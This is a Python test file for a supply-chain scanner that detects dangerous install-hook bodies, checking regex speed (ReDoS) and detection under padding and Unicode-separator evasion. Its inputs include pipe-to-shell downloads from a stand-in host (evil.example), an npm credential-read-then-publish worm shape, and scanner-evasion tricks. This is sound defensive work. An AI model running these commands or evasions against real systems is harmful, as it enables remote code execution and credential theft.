"""ReDoS regression tests for the shared hook-pattern substrate.

The curl/wget pipe-to-shell patterns previously used
``\\s+[^|]*\\s*`` — three adjacent overlapping quantifiers (the
negated class includes whitespace), quadratic on ``curl`` followed by
a long whitespace run with no pipe.  These tests pin:

  * the pathological input completes fast,
  * detection semantics are unchanged on the shapes we care about,
  * ``analyse_body`` bounds every regex input while scanning the
    whole body (truncation, where it still happens, fails toward
    review instead of silence).
"""

from __future__ import annotations

import time

from packages.sca.supply_chain._hook_patterns import (
    _MAX_HOOK_BODY_BYTES,
    _MAX_HOOK_SCAN_BYTES,
    SCAN_TRUNCATED_REASON,
    analyse_body,
)

_TIME_BUDGET_SECONDS = 0.5


# ---------------------------------------------------------------------------
# Timing — pre-fix this was quadratic
# ---------------------------------------------------------------------------

def test_curl_many_spaces_no_pipe_completes_fast() -> None:
    """``curl`` + 100k spaces + no pipe.  Pre-fix the overlapping
    quantifiers backtracked quadratically on this shape."""
    body = "curl" + " " * 100_000
    t0 = time.monotonic()
    analysis = analyse_body(body)
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS, (
        f"curl + 100k spaces took {elapsed:.3f}s — ReDoS regression"
    )
    assert "curl piped to shell" not in analysis.reasons


def test_wget_many_spaces_no_pipe_completes_fast() -> None:
    body = "wget" + " " * 100_000
    t0 = time.monotonic()
    analysis = analyse_body(body)
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS
    assert "wget piped to shell" not in analysis.reasons


# ---------------------------------------------------------------------------
# Detection semantics — unchanged by the pattern rewrite
# ---------------------------------------------------------------------------

def test_curl_pipe_bash_still_detected() -> None:
    analysis = analyse_body("curl https://evil.example/install.sh | bash")
    assert "curl piped to shell" in analysis.reasons


def test_curl_pipe_bash_no_spaces_still_detected() -> None:
    analysis = analyse_body("curl https://evil.example/i.sh|bash")
    assert "curl piped to shell" in analysis.reasons


def test_curl_with_flags_and_url_args_piped_still_detected() -> None:
    analysis = analyse_body(
        "curl -fsSL --retry 3 'https://evil.example/x.sh?arch=x64' | sh"
    )
    assert "curl piped to shell" in analysis.reasons


def test_wget_pipe_zsh_still_detected() -> None:
    analysis = analyse_body("wget -qO- https://evil.example/x.sh | zsh")
    assert "wget piped to shell" in analysis.reasons


def test_curl_without_pipe_not_flagged() -> None:
    analysis = analyse_body("curl -o out.tar.gz https://example.com/a.tgz")
    assert "curl piped to shell" not in analysis.reasons


def test_curl_piped_to_tar_not_flagged() -> None:
    analysis = analyse_body("curl -sL https://example.com/a.tgz | tar xz")
    assert "curl piped to shell" not in analysis.reasons


# ---------------------------------------------------------------------------
# Body-length cap
# ---------------------------------------------------------------------------

def test_payload_past_chunk_cap_still_detected() -> None:
    """A dangerous shape placed past the per-chunk bound IS scanned —
    the whole-file adapters feed entire attacker-authored source
    files through this substrate, and silently scanning only the
    first chunk made padding a total, zero-cost evasion of every
    signal."""
    padding = "echo ok\n" * (_MAX_HOOK_BODY_BYTES // 8 + 1)
    body = padding + "curl https://evil.example/x.sh | bash"
    assert len(body) > _MAX_HOOK_BODY_BYTES
    analysis = analyse_body(body)
    assert "curl piped to shell" in analysis.reasons
    # Nothing was left unscanned — no truncation row.
    assert SCAN_TRUNCATED_REASON not in analysis.reasons


def test_payload_past_scan_budget_fails_toward_review() -> None:
    """Content beyond the total scan budget cannot be attested — the
    analysis flags the truncation as a reason row instead of
    silently passing the file."""
    padding = "echo ok\n" * (_MAX_HOOK_SCAN_BYTES // 8 + 1)
    body = padding + "curl https://evil.example/x.sh | bash"
    analysis = analyse_body(body)
    assert SCAN_TRUNCATED_REASON in analysis.reasons


def test_oversized_single_line_fails_toward_review() -> None:
    """A single line longer than the chunk bound is cut (the only
    remaining truncation inside the budget) and must flag the
    analysis for review — a payload buried at the end of a giant
    one-liner cannot silently pass."""
    body = "x = '" + "A" * (_MAX_HOOK_BODY_BYTES + 512) \
        + "'; curl https://evil.example/x.sh | bash"
    analysis = analyse_body(body)
    assert SCAN_TRUNCATED_REASON in analysis.reasons


def test_worm_conjunction_across_distant_chunks_detected() -> None:
    """The credential-read and publish-action signals must survive
    chunking even when the two halves of the worm shape sit far
    apart in a large file body."""
    padding = "echo ok\n" * (_MAX_HOOK_BODY_BYTES // 8 + 1)
    body = "cat ~/.npmrc\n" + padding + "npm publish\n"
    analysis = analyse_body(body)
    assert analysis.reads_credentials
    assert analysis.has_publish_action


def test_dangerous_shape_before_cap_still_detected() -> None:
    body = "curl https://evil.example/x.sh | bash\n" + "echo ok\n" * 10_000
    analysis = analyse_body(body)
    assert "curl piped to shell" in analysis.reasons


def test_huge_body_completes_fast() -> None:
    """Multi-megabyte body — the cap keeps total pattern work bounded
    regardless of content."""
    body = ("curl " + " " * 512 + "\n") * 10_000
    t0 = time.monotonic()
    analyse_body(body)
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS


def test_versioned_interpreter_inline_exec_flagged() -> None:
    """``python3 -c`` is how hook bodies actually spell the
    interpreter on modern distros — the bare ``python -c`` pattern
    silently missed it. Both-direction: versioned names fire,
    tools merely PREFIXED with the interpreter name don't."""
    for body, expect in (
        ("python -c 'import os'", True),
        ("python3 -c 'import os'", True),
        ("python3.12 -c 'import os'", True),
        ("perl -e 'system(q(id))'", True),
        ("deno eval 'Deno.run()'", True),
        # Prefix-named tools are not inline execution.
        ("python-config -c", False),
        ("pythonic -c template", False),
    ):
        reasons = analyse_body(body).reasons
        fired = any("inline code execution" in r for r in reasons)
        assert fired == expect, (body, reasons)


def test_unicode_line_separator_at_chunk_seam_still_detected() -> None:
    """The pattern grammar treats only ``\\n`` as a line terminator —
    NEL/LS/PS are matchable bytes inside a dangerous span. A
    splitlines-based chunker turned them into seam points: an
    attacker-placed ``\\x85`` inside the match span, positioned so
    the two halves straddled a chunk flush, was missed with NO
    truncation row — silence. The ``\\n``-only chunker keeps every
    pattern-visible line whole."""
    payload_head = "curl " + "A" * 100 + "\x85"
    pad_count = (_MAX_HOOK_BODY_BYTES - len(payload_head)) // 2
    body = "e\n" * pad_count + payload_head + " | bash\n"
    analysis = analyse_body(body)
    assert "curl piped to shell" in analysis.reasons
    assert SCAN_TRUNCATED_REASON not in analysis.reasons


def test_oversized_line_with_unicode_separator_fails_toward_review() -> None:
    """An over-cap single ``\\n``-line carrying a NEL cannot be
    silently split either — it is truncated as ONE line and flagged
    for review."""
    body = "curl " + "A" * (_MAX_HOOK_BODY_BYTES + 512) + "\x85" + "| bash"
    analysis = analyse_body(body)
    assert SCAN_TRUNCATED_REASON in analysis.reasons
